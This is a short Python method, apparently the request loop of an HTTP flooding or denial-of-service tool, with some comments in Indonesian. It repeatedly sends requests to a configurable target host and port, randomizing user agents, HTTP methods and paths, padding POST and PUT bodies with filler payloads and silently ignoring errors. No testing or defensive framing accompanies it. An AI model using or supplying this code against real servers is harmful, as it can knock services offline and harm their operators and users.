def send_requests(self):
    while self.running:
        try:
            # Random user agent
            user_agent = random.choice(self.user_agents)
            
            # Random method
            method = random.choice(self.methods)
            
            # Random path
            path = random.choice(["/", "/index.html", "/login", "/admin", "/api", "/search"])
            
            # Headers
            headers = {
                "User-Agent": user_agent,
                "Accept": "*/*",
                "Connection": "keep-alive"
            }
            
            url = f"http://{self.target}:{self.port}{path}"
            
            # Kirim request sesuai method
            if method == "GET":
                requests.get(url, headers=headers, timeout=5)
            elif method == "POST":
                data = "A" * self.payload_size if self.payload_size > 0 else ""
                requests.post(url, data=data, headers=headers, timeout=5)
            elif method == "HEAD":
                requests.head(url, headers=headers, timeout=5)
            elif method == "PUT":
                data = "A" * self.payload_size if self.payload_size > 0 else ""
                requests.put(url, data=data, headers=headers, timeout=5)
            elif method == "DELETE":
                requests.delete(url, headers=headers, timeout=5)
            
            # Control rate
            time.sleep(1.0 / self.requests_per_second)
            
        except Exception as e:
            # Abaikan error dan lanjutkan
            pass
